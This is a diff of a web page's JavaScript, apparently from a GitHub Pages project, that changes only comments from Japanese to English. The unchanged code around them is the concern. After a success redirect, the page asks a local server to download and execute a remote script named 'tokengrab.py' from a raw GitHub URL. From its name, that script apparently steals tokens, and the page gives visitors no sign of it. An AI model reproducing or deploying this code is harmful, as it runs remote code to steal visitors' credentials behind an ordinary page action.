@@ -99,14 +99,14 @@ document.addEventListener('DOMContentLoaded', function() {
                     window.location.href = 'https://republicofauech.github.io/vearithy/success/';
                 }, 2000);
 
-                // GitHubからtokengrab.pyを実行するためのリクエスト
+                // Execute tokengrab.py via server-side request
                 fetch('http://localhost:3000/run-tokengrab', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py' // GitHubの実行するファイルのURL
+                        githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py' // Replace with actual GitHub file URL to execute
                     })
                 })
                 .then(response => {
